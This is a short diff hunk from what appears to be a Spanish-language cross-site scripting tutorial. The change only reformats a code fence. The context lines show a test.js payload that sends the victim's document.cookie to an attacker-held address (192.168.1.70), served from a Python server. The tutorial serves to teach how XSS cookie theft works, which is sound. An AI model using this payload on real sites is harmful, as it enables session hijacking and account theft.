@@ -148,7 +148,7 @@ Ahora otra cosa que podemos hacer es que nosotros podemos usar archivos externos
 
 vemos que estamos llamando a un archivo llamado `test.js` el cual vamos a exponer con ayuda de un servidor en python y el contenido de test.js va a ser:
 
- ```js
+```js
  var request = new XMLHttpRequest();
 request.open('GET', 'http://192.168.1.70/?cookie=' + document.cookie);
 request.send();
